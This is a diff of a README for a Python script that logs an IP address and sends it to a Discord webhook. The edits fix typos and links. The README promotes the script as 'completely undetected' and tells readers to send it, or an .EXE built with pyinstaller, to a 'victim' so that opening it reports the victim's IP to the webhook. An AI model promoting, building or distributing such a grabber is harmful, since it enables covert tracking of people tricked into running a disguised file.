@@ -5,14 +5,14 @@ A simple IP Address Logger for Discord Webhook written in Python. 📡
 
 # 👀 Features
 - ✅ Customizable Webhook address and name
-- ✅ Shows IP deatails directly in the webhook
+- ✅ Shows IP details directly in the webhook
 - ✅ Completly undetected
 - ✅ Simple to use
 - ⌚ I`m releasing .EXE builder very soon (I have some problems)
 
 
 1. After you open the file it will grab your IP Address and send it to a Discord Webhook
-2. You can send the Python script to the victim or convert to the .EXE file with `pyinstaller` [(Tutorial below)](/README.md#how-to-convert)
+2. You can send the Python script to the victim or convert it to the .EXE file with `pyinstaller` [Tutorial below](/main/README.md#how-to-convert)
 ## 📸 Webhook preview
 
 ![App Screenshot](https://i.ibb.co/4t2pvHV/image.png)
@@ -25,7 +25,7 @@ A simple IP Address Logger for Discord Webhook written in Python. 📡
 - Download the script
 
 ```bash
-  git clone https://link-to-project
+  git clone https://link-to-project or download the project normally
 ```
 
 - Install dependencies
